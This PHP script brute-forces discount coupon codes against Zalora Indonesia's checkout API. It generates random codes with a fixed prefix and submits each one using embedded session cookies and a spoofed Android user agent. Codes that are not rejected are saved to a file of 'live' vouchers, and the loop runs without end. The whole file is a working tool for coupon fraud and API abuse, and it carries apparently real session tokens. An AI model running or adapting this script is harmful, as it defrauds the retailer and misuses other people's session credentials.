<?php
login:
function randomString($length)
{
    $str        = "";
    $characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $max        = strlen($characters) - 1;
    for ($i = 0; $i < $length; $i++) {
        $rand = mt_rand(0, $max);
        $str .= $characters[$rand];
    }
    return $str;
}

$voc = 'TSBBO'.randomString(6);


$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.zalora.co.id/v1/checkout/coupon?applyCashback=false&d=a&setLang=in',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_NOBODY => false,
  CURLOPT_POSTFIELDS =>'coupon='.$voc.'&fromDeeplink=false&applyBestPromo=false',
  CURLOPT_HTTPHEADER => array(
    'Cookie: doraemonSessionId=MTYxODk1MzI0NnxYa2xBcHpWTUJfbjZUelFneTg1czUtbkREVDk3Sm1pMWJFQ3M3SzVJbUoySC1lQWNXTDBPamlWWDVZUnFZclVPcV9YTG9KRVVZXzBpMnJkaTBZTXk1ejFsSGZtNzhGVXFvVEN5MmdjenhZVXVuLVlXMjg4eHljMElzSnZIdmtycWpvNlMyT0NheXcwRE1uMnNiSGpjZWlFNERZZHh0T3ZiNlhwNThoT3h5NndIay1ldk1iZ0tXdFFVbTljalZvZ2Q4elFrWW9Td3psZHNLUXZHYTB4NTNfa2dwT2E3QXEwMldETWFlTDl5NWN1X2s4anJYOC1TZjV3ekFaOC14ck95Z1JYY0VVQVFleUp6VW94aXlkMkxjaEpWbDZmTVJ4b3RJdFFtMi1zMHRCRmJldzgxRGEzQWp4UTBQQ2gyN1p0VFZrNm9jbW1iOVJBdGVDN3QzYU9xcmVlZ0JSMFpXNXQtc3BDTGZla1lqeUxhV19yZWRkMW9rR1FUSnRlTDlOa1VHVHVIeFYxdHYtUmp2YjMxTmRDOG5scHN4aFdrN1BLT0JiUDN2ZUNvbWRuTm82WjFnbXI1aHBqWE83bG83U0ZucERzVkpUdXA5UlNUODZqblNxSWJRdThjNDhCRE1WY25OOG9WNzVTRnJnTmNvVU5aS2FzTnJDZmNjM2R6dzJVQWNjaE9CUkxSNW1OeDI4bG54U2Nza1lSZXFBeFNMMTBKTXl5VC1QVUZvTDk4TnBtRVN0Y3FpOVptLUpnc3NEYU9fSW4wdlQ0aUgtclBPTExiYzVPQ25HSG9tMjZIazZNb21MRTVNLUFRbTR1WjlJcTZsYmViYmNEU3duRVRKNmY3WXFyTkhKXzBGVTRnZVpoSmxXb2RtN0J2UzNLa0Q0ZFlaX2FzelJPY1FhV1FRUElWMDg0cTRnSzBNNlRRNEI2SU5teS1jNVhnVkhyM0JVQnBELTN1cHpWQ3RlTTRsOFRRZ0pDNVNfdzRRdThvXzBCQ1V4SnBGZGlVYXJCZ1VDU1Z5cDlWQXNoTWkyOTdZbEVSQU9FdDVNVHFKZVlEQUdjcjNyY0dNb0hiWm4tdTR3OG1Rd3FLYUFmZnVtanNaeDFvbmVFSmdYQUlSRmV5RG1xWGRzckdXbk5fbU5WdlJDNmgwRjZNLTJ2M3V5aElNZGEyZzV0aFEyU2FzSTBReEpqMWpTVURQQ0wwQXdqT1VlN0ZuZEVlblFReFBkc2I5YjRHVnJqckwtUW5SUTR3bmtLZXlfZUlCM1dFQ1NkQTlTek1CSTNpMlcydFFKVUVWbktjT3pna3lIM2FaTEtKSDJrZFMwYzdPMkRRN2hTUjBpMWI3enFQR3BKMWtJcXZBeVJfcjE3Ykp5Y1E4VUVMT2ptYnJxQVFPTWktcFZNdUdzMkpiYk5FSS1Td212X0RDOXlZSFctVlBJRnBYYm10eTZiajZMUVNYcUE5NVNDN1BPMlpVbDY3WkprTHVzeXM0dUlBQUVXYlBrYXRPdlZILUZEaktrWVo5NU9qNUNjcHFjU1VhOEhJY29IVlVzeHlEaTJaOThHVlFONWRHU3R1dEdqWG5faldBODBQME4zeHVJY1VfMHlFVV96c3ZiYjBTUDRxaTB5YnZiR2dWcERZQlE0M0Mtc01Jc04yUUI0WTVuYVVyRHlTVEZwaW81S3FVZ0RUMHNOY3Y5VlotMWJSMUdpUi1HYlNXMTdzfCteiPl_ioz7SMgIgOx8JIJ8bLlQ; f59f9fd9576397c679c3d3eb52622f8d=0a27781c5de30f3965d0578a4a38e7cd768974d3b3901b08c5a28d0b1816fa537accf82698f84e6e76fa6af241a80411123d35f30d7fe6593b16855c6b52b706%3Ad4f7ceec8f1cea7cb8e0bd28a63ed1998ad08b1ff6267d39913e20e1cf95eb67; doraemonSessionId=MTYxODk1Mzg5MXxjblZTMGkwWm90YmhPbWVDcFliRlctRDdtNHpLdFUtLXdwX0V2d21MRU53UzUyVDE1OGZDT0x0aHhvMmdyM2MzbFJKU1hKX1I3Q3F3bGRPLU9OdVU3WEJsbXV2NmV3aHRxODJpaHlRd3QyeFBHci03LTNYbEpzYWx1dHdmVlhoQ2xwb3JFcjJVaXZPRDY1djVpT1FMMEEyQUl6SlotVnFQbmh1cmVtMjJoa3cyREhZQnR4MXd2a3drVm1UVmxYQlUzQWZtcFpBZmVKdEJERjhGN3UtSi1QRHZoTmhKSzU1a3dNcDdXU0luOFFvTU1xRmZPdzJzbFlKTW90N3hXN2ZVLVlCVmxpcWJFa1FnZHUwVE9LeWNWb0dnRWR3cjI0aEdlVURWbzFYb1BXcEJPSFJFbFNraGFIVWRGXzN3STNkMTdrNUFxMVpsUkdEY1IyYzF2SXZRa0J5LUQ3UDFNSjhzNFNibzl1QjYxbTNqUWFZZHU2MHJSRW01TFRTVmxZaWN3WGxFZ0YwYnVJZ1FORWxHeERYeDMyc0RJXzlvMFFkYlp0TkhQZUNfUThXLVN5ekVYNl9QY3ZhRjZiX3VnT2hOdGRwb2h4Zm5vUVBXX25KSUtqc1ZFcW1IUGtSWDRDODBzSThfdnRFckEzUFN0OVdSQ2JjWmk0SlhFUk9aUnZBenRMWXhUelNyWmh0WFJSZDY0bkhlME1yY1dQRUF1d0dpdGp4bEE0QlcxVmhRZS1QSElHeG9wZC1oenMyZk90Tkk3Q1p6RmJiZF9ISVNhSElJbURnT05VSE5aQ2IxX3FiZVNjelA5MVBPUHVweXJUazRxZkRGaFc0WFladld2b3RDNEx2ck12TkIwbHgwVkV1ZVVfbW1FUVBDWHhaTGpTOEpnOFVzUkRERVdHYnpXR2tORWFQM2FXRlpPQ3A4QXcxNkNJQ3d2dmk5alFCUDJ1cTJiQ0ZMOG1IVG9RRUdSWEZRUlhoa2hrMVREVXdrWERvSldZMWlnT0xPeWxQanZZY0dpMnRzYlZyOE9KY3lpV2hjMV9nbDJaQXlJeWZtUXdGd0dkZWJOdGVVbHQ2US1HZEg1ejdCVDY1WEgzbnZQRDdwMzdkYmZTV21Eb0dZNVJfdUllbENEUWFfNVJXa2V1SWJuaXNGV0xYTmRtQmc1VUQxMU54dzM5eG1MRWx4bGo1TkNQdmF6b0tQWEctcHVfWFpmcERtdllfQlBBeExaVDhXTk5ROTQyYmlDLWFSN0huSmNUMmJOU0N6eElBYUZZeUN6d0l1ekFVazdKT3FSbFAzQTJkQ2dzNHJNZW9YOF9kTi0yOUFjUk5hX253c2lWT2RGSlZOMHlsdHpYbE16Qk9PLXpuN0xrLU9XSWpRSTVwc3d3c2V1QlljSWUxWTN5aXNCSDN1TWJaNGpaR1liMkZhNU5UeHZDbE4weXdIMUNreHRrRzNLMFc4S3VxZTNCTW5VRVV4eGhjRENFbzk2eHFOZXlIVEEwR1pjY0tCYU9qT3A5TzVONGtWWi15eG9UX1ZpSER6MjdkNVgxM1FScEtKOE9GQXBUdDBmSVhsOXhlQmhIZVJfRW1NSEZURk1sbl85RTZiWm10RlZmVUQ2a3E2MEFkbkVqdGtORC1hTWNMaUl4QW83YlhBd1hFWHVsN2Y4NjN1U3NWYjZ2ZHJqcmxVd3FQUXhpcUFQQklncUZYNUV2NFEycTRHfPJ1dWyxYq2dbDXSgF3Q5Zs0l5iP',
    'Host: api.zalora.co.id',
    'zalora-country: ID',
    'zalora-lang: in',
    'user-agent: Android/29/Xiaomi Redmi Note 8 Pro/364/0f607264fc6318a92b9e13c65db7cd3c/1080/2134/10.16.0',
    'content-type: application/x-www-form-urlencoded',
    'content-length: 58',
    'accept-encoding: gzip'
  ),
));

$response = curl_exec($curl);
$httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
curl_close($curl);
echo 'HTTP code: ' . $httpcode;
if($httpcode == 400){
 echo  "\033[0;31m $voc | INVALID";
    echo "\n";
	}else{
		$httpcode == 200;
    echo  "\033[0;32m $voc | VALID";
    echo "\n";
	$file = fopen("live_zalora.txt","a");  
    fwrite($file,"".$voc); 
    fwrite($file,"\n"); 
    fclose($file);  
	}
goto login;